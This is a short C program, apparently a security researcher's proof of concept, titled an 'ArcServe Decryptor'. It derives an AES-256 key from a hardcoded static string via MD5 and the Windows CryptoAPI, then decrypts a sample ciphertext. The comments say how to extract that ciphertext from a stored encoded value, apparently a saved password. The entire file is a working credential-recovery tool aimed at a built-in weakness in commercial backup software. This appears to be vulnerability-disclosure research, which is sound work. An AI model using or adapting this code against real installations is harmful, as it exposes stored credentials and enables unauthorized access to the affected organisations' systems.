#include <Windows.h>
#include <stdio.h>

int main(int argc, char** argv) {
	printf("\t\t-={ ArcServe Decryptor by Juan Manuel Fernandez (@TheXC3LL) - MDSec}=-\n\n");
	HCRYPTPROV phProv = NULL;
	HCRYPTHASH phHash = NULL;
	HCRYPTKEY phKey = NULL;

	BYTE enc[] = { 133, 60, 97, 192, 158, 159, 25, 141, 58, 250, 174, 169, 141, 216, 104, 98 }; // Text to decrypt (base64 decode and take everything after 0x80 bytes)
	
	BYTE key[] = { 0x50, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x61, 0x00, 0x73, 0x00, 0x65, 0x00, 0x20, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x70, 0x00, 0x75, 0x00, 0x74, 0x00, 0x20, 0x00, 0x61, 0x00, 0x20, 0x00, 0x76, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x64, 0x00, 0x20, 0x00, 0x70, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 0x77, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x64, 0x00 };
	DWORD pdwDataLen = sizeof(enc);

	if (!CryptAcquireContextW(&phProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		printf("[!] CryptAcquireContextW Failed!\n");
		exit(-1);
	}
	if (!CryptCreateHash(phProv, CALG_MD5, NULL, 0, &phHash)) {
		printf("[!] CryptCreateHash Failed!\n");
		exit(-1);
	}
	if (!CryptHashData(phHash, key, 58, 0)) {
		printf("[!] CryptHashData Failed!\n");
		exit(-1);
	}
	if (!CryptDeriveKey(phProv, CALG_AES_256, phHash, 16777220, &phKey)) {
		printf("[!] CryptDeriveKey Failed!\n");
		exit(-1);
	}
	CryptDecrypt(phKey, NULL, TRUE, 0, &enc, &pdwDataLen);
	printf("[+] Decrypted string: %S", enc);
}
